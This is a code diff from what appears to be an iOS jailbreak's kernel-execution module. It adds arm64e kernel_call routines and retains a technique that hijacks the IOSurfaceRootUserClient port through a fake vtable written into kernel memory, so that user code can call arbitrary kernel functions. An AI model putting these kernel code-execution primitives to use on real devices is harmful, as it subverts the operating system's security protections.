@@ -3,9 +3,11 @@
 #include "KernelStructureOffsets.h"
 #include "KernelUtilities.h"
 #include "find_port.h"
+#include "kernel_call/kernel_call.h"
 #include <common.h>
 #include <iokit.h>
 #include <pthread.h>
+#import <patchfinder64.h>
 
 mach_port_t prepare_user_client()
 {
@@ -38,6 +40,9 @@ const int fake_kalloc_size = 0x1000;
 
 void init_kexecute()
 {
+#if __arm64e__
+    kernel_call_init();
+#else
     user_client = prepare_user_client();
 
     // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
@@ -76,17 +81,25 @@ void init_kexecute()
     WriteKernel64(fake_vtable + 8 * 0xB7, GETOFFSET(add_x0_x0_0x40_ret));
 
     pthread_mutex_init(&kexecute_lock, NULL);
+#endif
 }
 
 void term_kexecute()
 {
+#if __arm64e__
+    kernel_call_deinit();
+#else
     WriteKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
     kmem_free(fake_vtable, fake_kalloc_size);
     kmem_free(fake_client, fake_kalloc_size);
+#endif
 }
 
 uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6)
 {
+#if __arm64e__
+    return kernel_call_7(addr, x0, x1, x2, x3, x4, x5, x6);
+#else
     pthread_mutex_lock(&kexecute_lock);
 
     // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
@@ -110,4 +123,5 @@ uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t
     pthread_mutex_unlock(&kexecute_lock);
 
     return returnval;
+#endif
 }
